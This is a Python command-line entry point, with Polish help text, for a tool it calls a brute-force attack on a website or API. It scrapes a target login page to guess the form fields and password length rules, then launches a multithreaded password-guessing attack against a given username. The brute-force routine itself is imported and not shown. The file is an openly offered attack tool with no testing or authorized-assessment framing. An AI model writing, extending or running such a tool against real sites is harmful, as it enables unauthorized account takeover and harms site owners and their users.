import argparse
from src.form_parser import guess_login_form, guess_password_rules
from src.brute import brute_force
from bs4 import BeautifulSoup
import requests

def main():
    parser = argparse.ArgumentParser(description="Brute-force atak na stronę WWW lub API (automatyczne wykrywanie pól formularza).")
    parser.add_argument('--target-url', required=True, help='Adres URL formularza logowania')
    parser.add_argument('--username', required=True, help='Login użytkownika')
    parser.add_argument('--charset', default='ascii_uppercase+digits', help='Zestaw znaków do zgadywania')
    parser.add_argument('--min-length', type=int, help='Minimalna długość hasła (domyślnie pobierane z formularza)')
    parser.add_argument('--max-length', type=int, help='Maksymalna długość hasła (domyślnie pobierane z formularza)')
    parser.add_argument('--threads', type=int, default=4, help='Liczba wątków')
    parser.add_argument('--success-string', required=True, help='Tekst w odpowiedzi po zalogowaniu (np. "Wyloguj")')
    parser.add_argument('--fail-string', default='', help='Tekst oznaczający błędne hasło (opcjonalnie)')
    parser.add_argument('--login-field', help='Nazwa pola loginu (opcjonalnie)')
    parser.add_argument('--password-field', help='Nazwa pola hasła (opcjonalnie)')
    parser.add_argument('--submit-field', help='Nazwa pola/przycisku submit (opcjonalnie)')
    args = parser.parse_args()

    print("🔎 Wykrywanie pól formularza logowania...")
    form_info = guess_login_form(args.target_url)
    print(f"➡️  Znaleziono: {form_info}")

    minlen, maxlen = 4, 12

    # Pobierz reguły hasła z formularza (jeśli nie podano ręcznie)
    if args.min_length and args.max_length:
        minlen, maxlen = args.min_length, args.max_length
        password_rules = {"minlength": minlen, "maxlength": maxlen}
    else:
        print("🔎 Analizuję pole hasła i jego reguły z formularza...")
        r = requests.get(args.target_url, timeout=8)
        soup = BeautifulSoup(r.text, "lxml")
        password_rules = guess_password_rules(soup, form_info["password_field"])
        minlen = password_rules.get("minlength", 4)
        maxlen = password_rules.get("maxlength", 12)

    print("\n=== 📝 WYKRYTE REGUŁY POLA HASŁA ===")
    for key, value in password_rules.items():
        print(f"  {key}: {value}")

    # Ostrzeżenie gdy nie wykryto wszystkich reguł
    if "minlength" not in password_rules or "maxlength" not in password_rules:
        print("⚠️  Nie udało się automatycznie wykryć wszystkich ograniczeń długości hasła. Używam wartości domyślnych lub podanych przez użytkownika.")

    print("\n=== 📝 WYKRYTE POLA FORMULARZA ===")
    print(f"  login_field:    {args.login_field or form_info['login_field']}")
    print(f"  password_field: {args.password_field or form_info['password_field']}")
    print(f"  submit_field:   {args.submit_field or form_info['submit_field']}")
    print(f"  extra_fields:   {form_info['extra_fields']}")
    print(f"  method:         {form_info['method']}")

    print("\n🚀 Start ataku brute-force...\n")

    brute_force(
        url=args.target_url,
        username=args.username,
        charset=args.charset,
        min_length=minlen,
        max_length=maxlen,
        threads=args.threads,
        success_string=args.success_string,
        fail_string=args.fail_string,
        login_field=args.login_field or form_info["login_field"],
        password_field=args.password_field or form_info["password_field"],
        submit_field=args.submit_field or form_info["submit_field"],
        extra_fields=form_info["extra_fields"],
        method=form_info["method"]
    )

if __name__ == '__main__':
    main()